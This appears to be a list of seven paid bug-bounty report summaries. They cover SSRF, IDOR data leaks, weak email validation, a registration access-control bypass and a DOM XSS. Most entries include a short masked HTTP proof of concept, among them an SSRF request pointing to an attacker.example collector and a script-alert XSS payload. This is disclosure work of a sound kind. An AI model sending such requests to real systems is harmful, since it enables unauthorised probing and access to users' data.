Report 1 — SSRF via /api/og/statistic (GET parameter "image")

Asset: analytics endpoint
Impact: internal network discovery
Status: Paid

A server-side fetch of attacker-controlled "image" parameter allowed requests to internal hosts resulting in DNS/HTTP callbacks captured on OOB collector.

Masked PoC (example)

GET /api/og/statistic?image=https://attacker.example/probe HTTP/1.1
Host: victim.example
User-Agent: PoC

Report 2 — IDOR via /api/Log?actionTag=parrainage-btn-envoyer

Asset: logging endpoint
Impact: unauthorized resource access
Status: Paid

POST parameter idAdhesion accepted arbitrary IDs which allowed enumeration and retrieval of other users' data.

Masked PoC (example)

POST /api/Log?actionTag=parrainage-btn-envoyer HTTP/1.1
Content-Type: application/json

{"idAdhesion": ""}

Report 3 — Weak Email Validation & Missing Anti-Automation Controls

Asset: user registration / workflows
Impact: account creation abuse / business logic abuse
Status: Paid

Email validation was weak and anti-automation protections were insufficient, enabling automated registrations and downstream abuse of business processes.

Notes

Suggested mitigations: enforce RFC-compliant validation, rate-limit endpoints, add CAPTCHA-like anti-automation where applicable, implement email verification flow.

Report 4 — Improper Access Control on api.prod.roole.fr (/api/auth/local/register)

Asset: authentication service
Impact: unauthorized user registration
Status: Paid

A registration flow allowed creation of accounts under conditions that bypassed intended access controls. This could be used to create accounts with elevated or unintended attributes.

Masked PoC (example)

POST /api/auth/local/register HTTP/1.1
Content-Type: application/json

{"email":"attacker@example.com","password":"P@ssw0rd"}

Report 5 — DOM XSS via /user/auth/chooseschema (GET parameter "tabId")

Asset: authenticated UI flow
Impact: DOM XSS
Status: Paid

Parameter "tabId" was reflected into the DOM without proper sanitization resulting in script execution in the user's context.

Masked PoC (example)

GET /user/auth/chooseschema?tabId=<script>alert(1)</script>

Report 6 — IDOR via /api/quotes/[UUID]/ (PII leak)

Asset: quotes API
Impact: exposure of personally identifiable information
Status: Paid

Fetching quote resources by UUID leaked PII of other users due to insufficient authorization checks on resource access.

Masked PoC (example)

GET /api/quotes/11111111-2222-3333-4444-555555555555 HTTP/1.1
Host: api.example

Report 7 — IDOR via /v2/apps/[ID]/users/{user_id}/verification-methods

Asset: verification methods API
Impact: access to encrypted verification methods
Status: Paid

Endpoint allowed enumeration of other users' verification-method resources, returning encrypted blobs that could be used for further analysis.

Masked PoC (example)

Host: api.example
